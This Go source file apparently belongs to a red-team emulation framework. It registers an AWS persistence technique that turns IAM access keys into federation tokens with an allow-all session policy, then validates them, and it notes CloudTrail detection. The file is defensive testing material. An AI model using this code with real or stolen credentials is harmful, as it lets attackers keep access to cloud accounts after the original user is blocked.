package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/sts"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"

)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.sts-federation-token",
		FriendlyName: "Generation of AWS temporary keys from IAM credentials",
		Description: `
Establishes persistence by generating new AWS temporary keys that remain functional even if the original IAM user is blocked.

Warm-up: 

- Create an IAM user and generate a pair of access keys.

Detonation: 

- Use the access keys from the IAM user to request temporary security credentials via AWS STS.
- Call the sts:GetCallerIdentity API to validate the usage of the new temporary credentials and ensure they are functional.

References:

- https://www.crowdstrike.com/en-us/blog/how-adversaries-persist-with-aws-user-federation/
- https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf
- https://fwdcloudsec.org/assets/presentations/2024/europe/sebastian-walla-cloud-conscious-tactics-techniques-and-procedures-an-overview.pdf
`,
		Detection: `
Through CloudTrail's <code>GetFederationToken</code> event.
'`,
		Platform: stratus.AWS,

		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	accessKeyID := params["access_key_id"]
	secretAccessKey := params["secret_access_key"]

	if accessKeyID == "" || secretAccessKey == "" {
		log.Println("Error: Missing required access key ID or secret access key")
		return nil
	}

	awsConfig, err := config.LoadDefaultConfig(context.Background(),
		config.WithCredentialsProvider(
			credentials.NewStaticCredentialsProvider(accessKeyID, secretAccessKey, ""),
		),
	)
	if err != nil {
		return errors.New("Error loading AWS configuration: " + err.Error())
	}

	stsClient := sts.NewFromConfig(awsConfig)

	federatedUserName := "stratus_red_team"
	sessionPolicy := `{
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Action": "*",
				"Resource": "*"
			}
		]
	}`

	log.Println("Calling GetFederationToken to obtain temporary credentials")
	getFederationTokenInput := &sts.GetFederationTokenInput{
		Name:   &federatedUserName,
		Policy: &sessionPolicy,
	}

	federationTokenResult, err := stsClient.GetFederationToken(context.Background(), getFederationTokenInput)
	if err != nil {
		return errors.New("Error getting federation token: " + err.Error())
	}

	log.Println("Successfully obtained federated credentials for user:", federatedUserName)

	tempCredentialsProvider := aws.NewCredentialsCache(
		credentials.NewStaticCredentialsProvider(
			*federationTokenResult.Credentials.AccessKeyId,
			*federationTokenResult.Credentials.SecretAccessKey,
			*federationTokenResult.Credentials.SessionToken,
		),
	)
	federatedConfig := awsConfig.Copy()
	federatedConfig.Credentials = tempCredentialsProvider

	federatedStsClient := sts.NewFromConfig(federatedConfig)

	log.Println("Calling STS with federated credentials to get the current user identity")
	federatedCallerIdentity, err := federatedStsClient.GetCallerIdentity(context.Background(), &sts.GetCallerIdentityInput{})
	if err != nil {
		return errors.New("Error getting caller identity with federated credentials: " + err.Error())
	}
	log.Println("Federated user identity:", *federatedCallerIdentity.Arn)

	return nil
}
